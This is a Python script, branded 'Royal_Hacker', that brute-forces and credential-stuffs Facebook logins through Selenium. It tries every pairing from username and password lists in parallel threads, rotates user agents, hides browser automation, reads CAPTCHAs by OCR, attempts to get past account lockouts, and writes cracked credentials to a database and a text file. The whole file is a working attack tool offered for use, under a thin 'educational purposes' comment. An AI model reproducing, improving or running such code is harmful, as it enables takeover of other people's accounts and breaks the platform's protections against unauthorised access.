import time
import asyncio
import aiohttp
import logging
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
import requests
from PIL import Image
import pytesseract
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
import random
import string
import sqlite3
import os


class LoginAutomation:
    def __init__(self):
        self.success_list = []
        self.total_attempts = 0
        self.success_count = 0
        self.user_agents = [
            # Add a list of user agents to rotate randomly during login attempts
            # Include a variety of user agents to make automation less detectable
        ]

    # Function to solve the CAPTCHA using OCR
    def solve_captcha(self, captcha_image_path):
        captcha_image = Image.open(captcha_image_path)
        captcha_text = pytesseract.image_to_string(captcha_image)
        return captcha_text

    # Function to automatically solve the CAPTCHA
    def auto_solve_captcha(self, captcha_image_path):
        # Place your automatic CAPTCHA solving logic here
        # For educational purposes, we will use OCR for this example
        captcha_text = self.solve_captcha(captcha_image_path)
        return captcha_text

    # Function to bypass login restrictions
    def bypass_login_restrictions(self, driver):
        try:
            restrictions = driver.find_elements(By.CSS_SELECTOR, "div[data-testid='login_error_message']")
            if restrictions:
                print("Login restrictions encountered. Bypassing...")
                return True
        except Exception as e:
            print(f"Error while checking login restrictions: {e}")
        return False

    # Function to bypass locked accounts
    def bypass_locked_account(self, driver):
        try:
            locked_message = driver.find_elements(By.CSS_SELECTOR, "div[data-testid='locked_error_message']")
            if locked_message:
                print("Account is locked. Attempting to unlock...")
                try:
                    unlock_button = driver.find_element(By.CSS_SELECTOR, "a[data-testid='unlock_account_link']")
                    unlock_button.click()
                    time.sleep(1)
                    if driver.current_url.startswith("https://www.facebook.com/checkpoint/"):
                        print("Account unlocking successful.")
                        return True
                except NoSuchElementException:
                    print("Unable to find the unlock button. Check if the account locking mechanism has changed.")
                except ElementClickInterceptedException:
                    print("Unlock button is not clickable. Check if any element is blocking it.")
        except Exception as e:
            print(f"Error while checking locked account: {e}")
        return False

    # Function to handle network and connection errors
    def handle_network_errors(self, driver, retry_attempt):
        try:
            connection_lost = driver.find_elements(By.XPATH, "//h2[contains(text(), 'Cannot Connect')]")
            if connection_lost:
                if retry_attempt < 3:
                    print("Network connection lost. Retrying...")
                    time.sleep(random.randint(1, 5))
                    return True
                else:
                    print("Failed to establish a stable network connection. Skipping.")
                    return False
        except Exception as e:
            print(f"Error while handling network errors: {e}")
        return False

    # Function to handle element not found errors
    def handle_element_not_found_errors(self, driver, retry_attempt):
        try:
            element_not_found = driver.find_elements(By.XPATH, "//h2[contains(text(), 'Not Found')]")
            if element_not_found:
                if retry_attempt < 3:
                    print("Element not found. Retrying...")
                    time.sleep(random.randint(1, 5))
                    return True
                else:
                    print("Failed to find the required element. Skipping.")
                    return False
        except Exception as e:
            print(f"Error while handling element not found errors: {e}")
        return False

    # Function to handle unexpected errors during login
    def handle_unexpected_errors(self, driver, retry_attempt):
        try:
            unexpected_error = driver.find_elements(By.XPATH, "//h2[contains(text(), 'Unexpected Error')]")
            if unexpected_error:
                if retry_attempt < 3:
                    print("Unexpected error occurred. Retrying...")
                    time.sleep(random.randint(1, 5))
                    return True
                else:
                    print("Failed to recover from the unexpected error. Skipping.")
                    return False
        except Exception as e:
            print(f"Error while handling unexpected errors: {e}")
        return False

    # Function to handle timeout errors during login
    def handle_timeout_errors(self, driver, retry_attempt):
        try:
            timeout_error = driver.find_elements(By.XPATH, "//h2[contains(text(), 'Timed Out')]")
            if timeout_error:
                if retry_attempt < 3:
                    print("Timeout error occurred. Retrying...")
                    time.sleep(random.randint(1, 5))
                    return True
                else:
                    print("Failed to recover from the timeout error. Skipping.")
                    return False
        except Exception as e:
            print(f"Error while handling timeout errors: {e}")
        return False

    # Function to handle CAPTCHA errors during login
    def handle_captcha_errors(self, driver, retry_attempt):
        try:
            captcha_error = driver.find_elements(By.XPATH, "//h2[contains(text(), 'Captcha Error')]")
            if captcha_error:
                if retry_attempt < 3:
                    print("CAPTCHA error occurred. Retrying...")
                    time.sleep(random.randint(1, 5))
                    return True
                else:
                    print("Failed to recover from the CAPTCHA error. Skipping.")
                    return False
        except Exception as e:
            print(f"Error while handling CAPTCHA errors: {e}")
        return False

    # Function to handle other login errors
    def handle_login_errors(self, driver, retry_attempt):
        try:
            other_errors = driver.find_elements(By.XPATH, "//h2[contains(text(), 'Error')]")
            if other_errors:
                if retry_attempt < 3:
                    print("Other login error occurred. Retrying...")
                    time.sleep(random.randint(1, 5))
                    return True
                else:
                    print("Failed to recover from the other login error. Skipping.")
                    return False
        except Exception as e:
            print(f"Error while handling other login errors: {e}")
        return False

    # Function to perform the login process
    def login(self, username_password):
        username, password = username_password
        chrome_options = Options()
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--allow-running-insecure-content")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")  # Make WebDriver undetectable
        chrome_version = "114.0.5735.133"
        user_agent = random.choice(self.user_agents)
        chrome_options.add_argument(f"--user-agent={user_agent}")
        driver = webdriver.Chrome(options=chrome_options)

        try:
            driver.get("https://www.facebook.com/")
            try:
                username_field = driver.find_element(By.ID, "email")
            except NoSuchElementException:
                print("Unable to find the username field. Check if the login page structure has changed.")
                driver.quit()
                return

            username_field.clear()
            username_field.send_keys(username)

            password_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "pass")))
            password_field.clear()
            password_field.send_keys(password)

            if driver.find_elements(By.CSS_SELECTOR, "img#captcha_image"):
                captcha_image_element = driver.find_element(By.CSS_SELECTOR, "img#captcha_image")
                captcha_image_url = captcha_image_element.get_attribute("src")
                with requests.get(captcha_image_url, stream=True) as response:
                    captcha_image_path = f"captcha_{username}_{password}.png"
                    with open(captcha_image_path, "wb") as image_file:
                        for chunk in response.iter_content(chunk_size=1024):
                            image_file.write(chunk)

                captcha_text = self.auto_solve_captcha(captcha_image_path)
                captcha_input = driver.find_element(By.CSS_SELECTOR, "input[name='captcha_response']")
                captcha_input.clear()
                captcha_input.send_keys(captcha_text)

            login_button = driver.find_element(By.NAME, "login")
            login_button.click()

            if any(cookie["name"] == "c_user" for cookie in driver.get_cookies()):
                print(f"Login successful for user: {username}")
                return username, password

            max_retries = 3
            for retry_attempt in range(max_retries):
                if self.handle_network_errors(driver, retry_attempt) or self.handle_element_not_found_errors(driver, retry_attempt) or \
                        self.handle_unexpected_errors(driver, retry_attempt) or self.handle_timeout_errors(driver, retry_attempt) or \
                        self.handle_captcha_errors(driver, retry_attempt) or self.handle_login_errors(driver, retry_attempt):
                    login_button.click()
                else:
                    break

            if any(cookie["name"] == "c_user" for cookie in driver.get_cookies()):
                print(f"Login successful for user: {username}")
                return username, password

            if self.bypass_locked_account(driver):
                return self.login(username_password)

        except Exception as e:
            print(f"An error occurred while logging in with username '{username}': {e}")

        finally:
            driver.quit()
    # Function to perform account verification
    def verify_account(self, username):
        # Place your account verification logic here
        print(f"Verifying account: {username}")
        time.sleep(5)
        print("Account verification complete.")

    # Function to generate random usernames and passwords
    def generate_credentials(self, length=8):
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        return username, password

    # Function to calculate the total number of attempts
    def calculate_total_attempts(self, usernames, passwords):
        self.total_attempts = len(usernames) * len(passwords)

    # Function to track the success rate of login attempts
    def track_success_rate(self):
        success_rate = (self.success_count / self.total_attempts) * 100
        print(f"Success rate: {success_rate:.2f}%")

    # Function to store the results of login attempts in a database
    def store_results(self):
        db_file_path = "login_results.db"  # Replace with the actual full path
        if os.path.exists(db_file_path):
            os.remove(db_file_path)  # Remove the existing database file

        conn = sqlite3.connect(f"file:{db_file_path}?mode=rwc", uri=True)
        cursor = conn.cursor()
        cursor.execute('CREATE TABLE IF NOT EXISTS login_attempts (username TEXT, password TEXT)')
        cursor.executemany('INSERT INTO login_attempts VALUES (?, ?)', self.success_list)
        conn.commit()
        conn.close()

    # Function to automate login attempts for a single user
    async def automate_single_user_login(self):
        username = input("Enter the username: ")
        password_file_path = input("Enter the path of the passwords file: ")

        with open(password_file_path, "r") as passwords_file:
            passwords = passwords_file.read().splitlines()

        self.calculate_total_attempts([username], passwords)

        with ThreadPoolExecutor(max_workers=7) as executor:
            loop = asyncio.get_running_loop()
            login_tasks = []
            for password in passwords:
                login_tasks.append(loop.run_in_executor(executor, self.login, (username, password)))

            for login_task in asyncio.as_completed(login_tasks):
                try:
                    result = await login_task
                    if result is not None:
                        self.success_list.append(result)
                        self.success_count += 1
                        self.verify_account(result[0])  # Verify the account after successful login
                except Exception as e:
                    print(f"An error occurred during the login process: {e}")

        if self.success_list:
            self.track_success_rate()
            self.store_results()
            output_file_path = "successful_logins.txt"
            with open(output_file_path, "w") as output_file:
                for username, password in self.success_list:
                    output_file.write(f"Username: {username}, Password: {password}\n")

            print(f"Successfully logged in with {len(self.success_list)} account(s). Check '{output_file_path}' for the credentials.")
        else:
            print("No successful logins.")

    # Function to automate login attempts for multiple users
    async def automate_multi_user_login(self):
        usernames_file_path = input("Enter the path of the usernames file: ")
        passwords_file_path = input("Enter the path of the passwords file: ")

        with open(usernames_file_path, "r") as usernames_file:
            usernames = usernames_file.read().splitlines()

        with open(passwords_file_path, "r") as passwords_file:
            passwords = passwords_file.read().splitlines()

        self.calculate_total_attempts(usernames, passwords)

        with ThreadPoolExecutor(max_workers=7) as executor:
            loop = asyncio.get_running_loop()
            login_tasks = []
            for username in usernames:
                login_tasks.append(loop.run_in_executor(executor, self.login, (username, username)))
                for password in passwords:
                    login_tasks.append(loop.run_in_executor(executor, self.login, (username, password)))

            for login_task in asyncio.as_completed(login_tasks):
                try:
                    result = await login_task
                    if result is not None:
                        self.success_list.append(result)
                        self.success_count += 1
                        self.verify_account(result[0])  # Verify the account after successful login
                except Exception as e:
                    print(f"An error occurred during the login process: {e}")

        if self.success_list:
            self.track_success_rate()
            self.store_results()
            output_file_path = "successful_logins.txt"
            with open(output_file_path, "w") as output_file:
                for username, password in self.success_list:
                    output_file.write(f"Username: {username}, Password: {password}\n")

            print(f"Successfully logged in with {len(self.success_list)} account(s). Check '{output_file_path}' for the credentials.")
        else:
            print("No successful logins.")

    # Function to choose between single user or multi-user attack
    def choose_attack_type(self):
        print("Choose the attack type:")
        print("1. Single User attack")
        print("2. Multi-User multi")

        attack_type = input("Enter the attack type (1 or 2): ")
        if attack_type == "1":
            asyncio.run(self.automate_single_user_login())
        elif attack_type == "2":
            asyncio.run(self.automate_multi_user_login())
        else:
            print("Invalid choice. Please enter 1 or 2.")
            self.choose_attack_type()


if __name__ == '__main__':
    # Set up logging
    logging.basicConfig(filename='automated_login_log.txt', level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')

    # Print the banner
    print(colored("*" * 50, "magenta"))
    print(colored("*" + " " * 48 + "*", "magenta"))
    print(colored("*", "magenta"), colored(" " * 18 + "Royal_Hacker" + " " * 16, "yellow"), colored("*", "magenta"))
    print(colored("*" + " " * 48 + "*", "magenta"))
    print(colored("*" * 50, "magenta"))
    print(colored("*   Developed by Raghubir Raj Mahato             *", "cyan"))
    print(colored("*" * 50, "magenta"))

    # Log start of the automated login attempts
    logging.info("Automated login attempts started.")

    # Create an instance of LoginAutomation class
    login_automation = LoginAutomation()

    # Load user agents list
    login_automation.user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5736.133 Safari/537.37",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5737.133 Safari/537.38",
        # Add more user agents as required
    ]

    # Choose the attack type
    login_automation.choose_attack_type()

    # Log end of the automated login attempts
    logging.info("Automated login attempts finished.")
